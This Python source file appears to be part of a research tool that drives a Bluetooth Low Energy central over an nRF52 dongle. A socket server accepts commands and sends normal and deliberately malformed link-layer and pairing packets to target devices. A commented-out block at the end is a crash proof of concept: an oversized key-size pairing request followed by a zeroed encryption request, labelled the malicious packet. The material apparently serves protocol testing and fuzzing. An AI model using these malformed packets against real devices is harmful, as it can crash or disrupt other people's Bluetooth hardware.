            start = characteristic.handle + 1
            if j >= len(service.characteristics) - 1:
                if i >= len(self.slave_device.services) - 1:
                    end = service.end
                else:
                    end = self.slave_device.services[i + 1].start - 1
            else:
                end = service.characteristics[j + 1].handle - 1

            self.slave_service_idx = i
            self.slave_characteristic_idx = j + 1
            self.slave_characteristic = characteristic
            self.slave_next_start_handle = start
            self.slave_next_end_handle = end
            self.att.find_information(None, start, end)
            return False

        return False

    def send_read_request(self):
        if self.slave_handles is None:
            print("slave_handles is None!!")
            return
        if len(self.slave_handles) > 0:
            try:
                self.att.read(self.slave_handles[self.slave_handles_idx], None)
            except:
                pass
        self.slave_handles_idx += 1


    def finish_readings(self):

        if ATT_Read_Response in self.pkt:
            pkt = self.pkt[ATT_Read_Response]
            try:
                self.slave_handles_values.update({self.slave_handles[self.slave_handles_idx - 1]: pkt.value})
            except:
                pass

        if (ATT_Hdr in self.pkt and self.pkt[ATT_Hdr].opcode is 0x0B) or ATT_Error_Response in self.pkt:
            self.machine.reset_state_timeout()  # Clear timeout timer
            self.v += 1
            if ATT_Error_Response in self.pkt:
                e = self.pkt[ATT_Error_Response].ecode
                if e in _att_error_codes:
                    print("Error code: " + _att_error_codes[e])
                else:
                    print(Fore.RED + "Error code: " + str(e))

            if self.slave_handles_idx < len(self.slave_handles):
                self.send_read_request()

    
            else:
                print(Fore.GREEN + '[!] Readings finished')
                self.slave_handles_idx = 0
                return True
        if self.slave_handles_idx > len(self.slave_handles):
            self.machine.reset_state_timeout()  # Clear timeout timer
            self.slave_handles_idx = 0
            print(Fore.GREEN + '[!] Readings finished')
            return True
        return False

    def send_write_request(self):

        try:
            if self.slave_handles[self.slave_handles_idx] in self.slave_handles_values:
                value = self.slave_handles_values[self.slave_handles[self.slave_handles_idx]]
            else:
                value = '\x00'
            self.att.write_req(self.slave_handles[self.slave_handles_idx], value, None)
        except:
            print("caught exception in send_write_request")
            pass
        if self.slave_handles_idx is None:
            return
        self.slave_handles_idx += 1

    def finish_writing(self):

        if (ATT_Write_Response in self.pkt) or ATT_Error_Response in self.pkt:
            self.machine.reset_state_timeout()  # Clear timeout timer

            if ATT_Error_Response in self.pkt:
                e = self.pkt[ATT_Error_Response].ecode
                if e in _att_error_codes:
                    print("Error code: " + _att_error_codes[e])
                else:
                    print(Fore.RED + "Error code: " + str(e))

            if self.slave_handles_idx < len(self.slave_handles):
                # pkt = BTLE('7083329a0208040004003e0700003a7135'.decode('hex'))
                # self.send(pkt)
                self.send_write_request()
            else:
                print(Fore.GREEN + '[!] Writting finished')
                self.slave_handles_idx = 0
                return True
        if self.slave_handles_idx > len(self.slave_handles):
            self.machine.reset_state_timeout()  # Clear timeout timer
            self.slave_handles_idx = 0
            print(Fore.GREEN + '[!] Writting finished')
            return True

    def send_disconn_request(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_TERMINATE_IND(code=0x13)
        self.send(pkt)
    
    def send_connection_papram_update_request(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_CONNECTION_UPDATE_REQ()
        self.send(pkt)
        
        
    def send_connection_papram_update_request_custom(self, comb):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_CONNECTION_UPDATE_REQ()
        if(comb == 1):    # all zero
            pkt[LL_CONNECTION_UPDATE_REQ].timeout = 0x00
        elif(comb == 2):
            pkt[LL_CONNECTION_UPDATE_REQ].timeout = 0x01
            pkt[LL_CONNECTION_UPDATE_REQ].latency = 0xffff
        elif(comb == 3):
            pkt[LL_CONNECTION_UPDATE_REQ].interval = 0x01
            pkt[LL_CONNECTION_UPDATE_REQ].latency = 0x01
            pkt[LL_CONNECTION_UPDATE_REQ].timeout = 0xffff    
        pkt.show()
        self.send(pkt)
        
    def send_channel_map_update_request(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_CHANNEL_MAP_REQ()
        pkt.show()
        self.send(pkt)
    
    def send_channel_map_update_request_custom(self, chm):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_CHANNEL_MAP_REQ()
        if chm == 1:
            pkt[LL_CHANNEL_MAP_REQ].chM = 0x00
        elif chm == 2:
            pkt[LL_CHANNEL_MAP_REQ].chM = self.conn_channel_map - 1
        pkt.show()
        self.send(pkt)
        
        
        
        
    def send_unknown_response(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_UNKNOWN_RSP()
        pkt.show()
        self.send(pkt)

    def send_reject_ind(self):
        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / CtrlPDU() / LL_REJECT_IND()
        pkt.show()
        self.send(pkt)

def client_handler(client_socket):
    # reboot_env(device,environment)
    global command
    global acl_frag_flag
    model = BLECentralMethods(states, transitions,
                              master_mtu = 247,  # 23 default, 247 max (mtu must be 4 less than max length)
                            #   master_address='a4:c1:38:d8:ad:a9', # will take these inputs from from socket
                            #   slave_address='1c:1b:b5:1e:52:5c',   # will take these inputs from a git ignored config file
                              dongle_serial_port='/dev/ttyACM0',
                              baudrate=115200,
                              monitor_magic_string='ESP-IDF v4.1', enable_fuzzing=False,
                              enable_duplication=False, client_socket=client_socket)
    while True:
        # data received from client
        data = client_socket.recv(1024)

        if not data:
            print('Bye')
            # lock released on exit
            print_lock.release()
            break

        command = data.lower()

        print("* COMMAND RECEIVED  :", command, "*")
        if ":" not in command:
            command = command.strip().split()[-1]
        else:
            command = command.replace('\\n','\n').strip('\n')
        print("* CHANGED COMMAND:", command, "*")

        if "reset" in command:
            #model.master_address = str(RandMAC()).upper()
            print("Received reset command!")
            model.reset_vars()
            model.send_disconn_request()
            # model.reset_dongle_connection()
            #model.sniff()
            model.disable_timeout('conn_supervision_timer')
            model.disable_timeout('conn_general_timer')
            # model.machine.reset_machine()
            #model.conn_slave_packet_counter = 0
            model.conn_ediv = '\x00'  # this is 0 on first time pairing
            model.conn_rand = '\x00'  # this is 0 on first time pairing
    
            client_socket.send('DONE\n')
        
        if "probe_enc_status" in command:
            print("Received probe_enc_status command!")
            client_socket.send(str(model.conn_encryted)+"\n")

        if command == "discon_req" or command == "discon_req:":
            print("Received discon_req command!")
            model.conn_encryted = False
            model.conn_slave_packet_counter = 0
            model.send_disconn_request()
            client_socket.send('DONE\n')

        elif command == "scan_req" or command == "scan_req:":
            print("received scan_req from algo")
            model.send_scan_request()
            model.sniff()

        elif "enc_req" in command:
            if command == "enc_req" or command == "enc_req:":   
                print("received enc_req from algo")
                model.send_encryption_request()
                model.sniff()
            else:
                edivrand = 0
                op = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "edivrand" :
                        print("received send_encryption_request_custom from algo")
                        edivrand = field.value
                    elif field.name == "op":
                        print("received send_encryption_request_custom from algo")
                        op = field.value
                model.send_encryption_request_custom(edivrand,op)
                model.sniff()


        
        
        elif "enc_pause_req" in command:
            if command == "enc_pause_req" or command == "enc_pause_req:":   
                print("received enc_pause_req from algo")
                model.send_encryption_pause_request()
                model.sniff()
            else:
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                if message.fields[0].name == "plain" and message.fields[0].value == 1:
                    print("received send_encryption_pause_request_plain from algo")
                    model.send_encryption_pause_request_plain()
                    model.sniff()
                else:
                    model.send_encryption_pause_request()
                    model.sniff()   
                    
        elif "enc_pause_resp" in command:
            if command == "enc_pause_resp" or command == "enc_pause_resp:":   
                print("received enc_pause_resp from algo")
                model.send_encryption_pause_response()
                model.sniff()
            else:
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                if message.fields[0].name == "plain" and message.fields[0].value == 1:
                    print("received enc_pause_resp_plain from algo")
                    model.send_encryption_pause_response_plain()
                    model.sniff()
                else:
                    model.send_encryption_pause_response()
                    model.sniff()
                    
        elif "start_enc_resp" in command:
            if command == "start_enc_resp" or command == "start_enc_resp:":   
                print("received start_enc_resp from algo")
                model.send_start_encryption_response()
                model.sniff()
            else:
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                if message.fields[0].name == "plain" and message.fields[0].value == 1:
                    print("received start_enc_resp_plain from algo")
                    model.send_start_encryption_response_plain()
                    model.sniff()
                else:
                    model.send_start_encryption_response()
                    model.sniff()           
            
            
        
        elif "sec_service_req" in command:
            print("received sec_service_req from algo")
            model.send_sec_services_request()
            model.sniff()


        elif "feature_resp_none" in command:
            print("received feature response none")
            model.send_feature_response_feature_set_zero()
            model.sniff()

        elif "feature_resp" in command:
            print("received feature response")
            model.send_feature_response()
            model.sniff()
        
        elif "mtu_resp_llid_zero" in command:
            print("received mtu_resp_llid_zero from algo")
            model.send_mtu_length_response_llid_zero()
            model.sniff()

        elif "mtu_resp_mtu_zero" in command:
            print("received mtu_req_mtu_zero from algo")
            model.send_mtu_length_response_mtu_zero()
            model.sniff()

        elif "mtu_resp" in command:
            print("received mtu response from algo")
            model.send_mtu_length_response()
            model.sniff()



        elif "mtu_req" in command:
            if command == "mtu_req" or command == "mtu_req:":   
                model.send_mtu_length_request()
                model.sniff()
            else:
                ll_length = 0
                llid = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "ll_length" :
                        print("received mtu_req_ll_length_custom from algo")
                        ll_length = field.value
                    elif field.name == "llid":
                        print("received mtu_req_llid_custom from algo")
                        llid = field.value
                model.send_mtu_length_request_custom(ll_length,llid)
                model.sniff()


        elif "con_req" in command:
            print("received con_req from algo")
            if command == "con_req" or command == "con_req:":
                model.send_connection_request()
                if "steval" in device:
                    model.sniff(5)
                else:
                    model.sniff()
            else:
                interval = 0
                timeout = 0
                ll_length = 0
                channel_map = 0
                hop = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue

                for field in message.fields:
                    if field.name == "interval":
                        print("received con_req_interval_custom from algo")
                        interval = field.value

                    elif field.name == "timeout":
                        print("received con_req_timeout_custom from algo")
                        timeout = field.value
                        
                    elif field.name == "channel_map":
                        print("received con_req_channel_map_custom from algo")
                        channel_map = field.value
                        
                    elif field.name  == "ll_length":
                        print("received con_req_ll_length_custom from algo")
                        ll_length = field.value
                        
                    elif field.name  == "hop":
                        print("received con_req_hop_custom from algo")
                        hop = field.value
                model.send_connection_request_custom(interval, timeout, ll_length, channel_map, hop)
                if "steval" in device:
                    model.sniff(5)
                else:
                    model.sniff()

                        
                


        elif "key_exchange_invalid" in command:
            print("received key_exchange_invalid from algo")
            if acl_frag_flag:
                model.send_public_key_invalid_frag()
            else:
                model.send_public_key_invalid()
            model.sniff()
            

        
        elif "key_exchange" in command:     
            if command == "key_exchange" or command == "key_exchange:":   
                print("received key_exchange from algo")   
                if acl_frag_flag:
                    print("sending public key frag")
                    model.send_public_key_frag()
                else:
                    print("sending public key")
                    model.send_public_key()
                model.sniff()
            else:
                invalid = 0
                ll_length = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "invalid":
                        print("received key_exchange_invalid_custom from algo")
                        invalid = field.value
                    elif field.name  == "ll_length" and field.value == 1:
                        print("received key_exchange_max_len_custom from algo")
                        ll_length = field.value
                if acl_frag_flag:
                    model.send_public_key_frag_custom(invalid,ll_length)
                else:
                    model.send_public_key_custom(invalid,ll_length)
                model.sniff()


        elif "dh_check" in command:
            if command == "dh_check" or command == "dh_check:": 
                model.send_dh_check()
                model.sniff()
            else:
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                if message.fields[0].name == "invalid" and message.fields[0].value == 1:
                    print("received dh_check_invalid from algo")
                    model.send_dh_check_invalid()
                    model.sniff()
                else:
                    model.send_dh_check()
                    model.sniff()


        elif command == "pri_req" or command == "pri_req:":
            print("received pri_req from algo")
            model.send_pri_services_request()
            model.sniff()

        elif "char_req" in command:
            print("received char_req from algo")
            model.send_characteristics_request()
            model.sniff()
        
        elif "pair_req_no_sc_keyboard_display" in command:
            print("received pair_req_no_sc_keyboard_display from algo")
            model.send_pair_request_no_sc_keyboard_display()
            model.sniff(5)


            
        elif "pair_req" in command:
            if command == "pair_req" or command == "pair_req:":   
                model.send_pair_request()
                model.sniff(5)
            else:
                oob = 0
                no_sc = 0
                key = 0
                llid = 0
                key_disp = 0
                yes_no = 0
                bonding = 0
                auth = 0
                init_key = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "oob":
                        print("received pair_req_oob_custom from algo")
                        oob = field.value
                    elif field.name == "no_sc":
                        print("received pair_req_no_sc_custom from algo")
                        no_sc = field.value
                    elif field.name == "key":
                        print("received pair_req_key_custom from algo")
                        key = field.value
                    elif field.name == "llid":
                        print("received pair_req_llid_custom from algo")
                        llid = field.value
                    elif field.name == "key_disp":
                        print("received pair_req_key_disp_custom from algo")
                        key_disp = field.value
                    elif field.name == "yes_no":
                        print("received pair_req_yes_no_custom from algo")
                        yes_no = field.value
                    elif field.name == "bonding":
                        print("received pair_req_bonding_custom from algo")
                        bonding = field.value
                    elif field.name == "auth":
                        print("received pair_req_auth_custom from algo")
                        auth = field.value
                    elif field.name == "init_key":
                        print("received pair_req_init_key_custom from algo")
                        init_key = field.value

                else:
                    model.send_pair_request_custom(oob, no_sc, key, llid, key_disp, yes_no, auth, init_key)
                model.sniff(7)  
    

        elif "sign_info" in command:
            print("received sign_info from algo")
            model.send_sign_info()
            model.sniff()

        
        elif "version_req" in command:
            if command == "version_req" or command == "version_req:":   
                model.send_version_indication()
                model.sniff()
            else:
                ll_length = 0
                llid = 0
                replay = 0
                op = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "ll_length" :
                        print("received version_indication_ll_length_custom from algo")
                        ll_length = field.value
                    elif field.name == "llid":
                        print("received version_indication_llid_custom from algo")
                        llid = field.value
                    elif field.name == "replay":
                        print("received version_indication_replay_custom from algo")
                        replay = field.value
                    elif field.name == "op":
                        print("received version_indication_op_custom from algo")
                        op = field.value
                model.send_version_indication_custom(ll_length,llid,replay,op)
                model.sniff()
            

        elif "pair_confirm" in command:
            if command == "pair_confirm" or command == "pair_confirm:":  
                model.send_pair_confirm()
                model.sniff(5)
            else:
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                if message.fields[0].name == "wrong_value" and message.fields[0].value == 1:
                    print("received pair_confirm_wrong_value from algo")
                    model.send_pair_confirm_wrong_value()
                    model.sniff()
                else:
                    model.send_pair_confirm()
                    model.sniff()


        elif command == "sm_random_send" or command == "sm_random_send:":
            print("received sm_random_send from algo")
            model.send_sm_random()
            model.sniff()

        elif "desc_req" in command:
            print("received desc_req from algo")
            model.send_descriptors_request()
            model.sniff()

        elif "includes_req" in command:
            print("received includes_req from algo")
            model.send_includes_request()
            model.sniff()

        elif "read" in command:
            print("received read from algo")
            model.send_read_request()
            model.sniff()

        elif "write" in command:
            print("received write from algo")
            model.send_write_request()
            model.sniff()

        elif "length_req" in command:
            if command == "length_req" or command == "length_req:":  
                model.send_length_request()
                model.sniff(3)
            else:
                ll_length = 0
                tx_rx = 0
                txrx_time = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "ll_length" :
                        print("received length_req_ll_length_custom from algo!!!")
                        ll_length = field.value
                    elif field.name == "tx_rx":
                        print("received length_req_tx_rx_custom from algo!!!")
                        tx_rx = field.value
                    elif field.name == "txrx_time":
                        print("received length_req_txrx_time_custom from algo!!!")
                        txrx_time = field.value
                model.send_length_request_custom(ll_length, tx_rx, txrx_time)
                model.sniff()
        
        elif "length_resp_rx_tx_zero" in command:
            print("!!received length response!!")
            model.send_length_response_zero_rx_tx()
            #sleep(1)
            #model.send_mtu_length_response()
            model.sniff()
        
        elif "length_resp_time_zero" in command:
            print("!!received length response!!")
            model.send_length_response_zero_time()
            #sleep(1)
            #model.send_mtu_length_response()
            model.sniff()

        elif "length_resp" in command:
            print("!!received length response!!")
            model.send_length_response()
            #sleep(1)
            #model.send_mtu_length_response()
            model.sniff()
            
        elif command == "feature_req" or command == "feature_req:":    
            print ("received feature request")
            model.send_feature_request()
            model.sniff()
            
        elif command == "pri_resp" or command == "pri_resp:":
            model.send_pri_services_response()
            model.sniff()

        elif command == "unknown_resp" or command == "unknown_resp:":
            print("received unknown_resp")
            model.send_unknown_response()
            model.sniff()
            
        elif "conn_update" in command:  
            print("received conn_update from algo")
            if command == "conn_update" or command == "conn_update:":  
                model.send_connection_papram_update_request()
                model.sniff()
            else:
                comb = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "comb":
                        comb = field.value
                model.send_connection_papram_update_request_custom(comb)
                model.sniff()
                    
        elif "channel_map_req" in command:   
            print("received channel_map_update_request from algo")
            if command == "channel_map_req" or command == "channel_map_req:":
                model.send_channel_map_update_request()
                model.sniff()
            else:
                chm = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "chm":
                        chm = field.value
                model.send_channel_map_update_request_custom(chm)
                model.sniff()
        
        elif "feature_resp" in command:
            print("received feature response from algo")
            if command == "feature_resp" or command == "feature_resp:":  
                model.send_feature_response()
                model.sniff()
            else:
                fzero = 0
                message = parse_cmd(command)
                if message.name == "unknown":
                    client_socket.send("unknown\n")
                    continue
                for field in message.fields:
                    if field.name == "fzero":
                        fzero = field.value
                    model.send_feature_response_feature_set_zero()
                    model.sniff()
            
        
        elif "update_slave_address" in command:
            print("received update_slave_address from algo:")
            new_slave_address = command.split("-")[1].strip()
            print("received new_slave_address:", new_slave_address)
            model.adjust_slave_addr(new_slave_address)
            print("updated slave address with :", new_slave_address)
            model.client_socket.send("DONE\n")
        else:
            if "reset" not in command:
                print("!!!!!!!!!!!!!!!!Unknown command:", command)
                model.client_socket.send("Unknown command\n")

    client_socket.close()


# model.get_graph().draw('bluetooth/ble_central.png', prog='dot')

def Main():
    global device
    global acl_frag_flag
    import sys
    import socket

    host = ""
    port = 60000
    if (len(sys.argv)<2):
        print('Usage: ble_central.py <device name> bluez, nexus6...')
        exit()
    device = sys.argv[1]
    print("Device: "+device )
    if "huaweiy5" in device or "htcdesire10" in device or "cy63" in device or "BlueNRG" in device:
        print("acl_frag_flag = True")
        acl_frag_flag = True
    else:
        acl_frag_flag = False
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    print("socket binded to post", port)
    s.listen(5)
    print("socket is listening")

    while True:
        # establish connection with client
        client_socket, addr = s.accept()

        # lock acquired by client
        print_lock.acquire()
        print('Connected to :', addr[0], ':', addr[1])

        # Start a new thread and return its identifier
        start_new_thread(client_handler, (client_socket,))
    s.close()


if __name__ == '__main__':
    Main()
'''
model.send_scan_request()
#model.receive_scan_response()
model.sniff()
model.send_connection_request()
model.sniff()
model.sniff()
model.sniff()
#model.sniff()
#model.sniff()
model.send_feature_request()
model.sniff()
model.send_length_request()
model.sniff()


model.send_mtu_length_request()
model.send_mtu_length_request()
model.send_mtu_length_request()
model.send_mtu_length_request()
model.send_mtu_length_request()
model.sniff()
model.send_mtu_length_request()
model.send_mtu_length_request()
model.sniff()
model.sniff()
model.sniff()
model.sniff()



model.send_pair_request()
model.send_pair_request()
model.send_pair_request()
model.send_pair_request()
model.send_pair_request()
model.sniff()
model.send_pair_request()
model.send_pair_request()
model.sniff()
model.sniff()
model.sniff()
model.sniff()
'''

'''
master_address = 'A4:C1:38:D8:AD:A9'
access_address = 0x9a328370
# Internal vars
none_count = 0
end_connection = False
connecting = False
slave_addr_type = 0


serial_port = '/dev/ttyACM0'
print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].lower()
else:
    advertiser_address = '1C:1B:B5:1E:52:5C'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())

driver = NRF52Dongle(serial_port, '115200')


while True:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
            connecting = True
            slave_addr_type = pkt.TxAdd
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell Bluetooth SIG as this is forbidden by
            # them!!!
            driver.send(conn_request)
        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
            # Send version indication request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
            driver.send(pkt)

        elif LL_VERSION_IND in pkt:
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt)

        elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
            # Here we send a key size with 253, which is way higher than the usual 16 bytes for the pairing procedure
            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
                iocap=4, oob=0, authentication=0x05, max_key_size=253, initiator_key_distribution=0x07,
                responder_key_distribution=0x07)
            driver.send(pairing_req)
            wrpcap(os.path.basename(__file__).split('.')[0] + '.pcap',
                   NORDIC_BLE(board=75, protocol=2, flags=0x3) / pairing_req)  # save packet just sent

        elif SM_Pairing_Response in pkt:
            enc_request = BTLE(
                access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ()  # encryption request with 0 values
            driver.send(enc_request)  # Send the malicious packet (2/2)
            end_connection = True

        elif end_connection == True:
            end_connection = False
            scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                ScanA=master_address,
                AdvA=advertiser_address)
            print(Fore.YELLOW + 'Connection reset, malformed packets were sent')

            print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
            driver.send(scan_req)
            start_timeout('crash_timeout', 7, crash_timeout)

    sleep(0.01)

# try:
while True:
    sleep(1000)
'''